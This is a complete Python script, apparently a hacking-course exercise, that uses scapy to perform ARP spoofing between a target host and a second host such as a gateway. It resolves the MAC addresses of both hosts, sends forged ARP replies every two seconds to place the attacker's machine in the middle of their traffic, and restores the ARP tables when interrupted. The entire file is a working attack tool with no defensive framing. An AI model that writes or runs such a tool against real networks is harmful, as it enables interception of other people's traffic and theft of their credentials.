import scapy.all as scapy
import time
import sys
import argparse
import subprocess


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Target IP")
    options = parser.parse_args()
    if not options.target:
        parser.error("Target IP needed, use --help for more info")
    if not options.spoof:
        parser.error("Spoof IP needed, use --help for more info")
    return options.target, options.spoof


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              verbose=False)[0]
    return answered_list[0][1].hwsrc


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def spoof(tar_ip, spoof_ip):
    tar_mac = get_mac(tar_ip)
    packet = scapy.ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


packet_count = 0
target_ip, spoof_ip = get_arguments()
try:
    while True:
        packet_count += 2
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        print("\rpacket sent :"+str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip)
    print("\nCODE TERMINATED")
    print("ARP TABLE RESTORED")
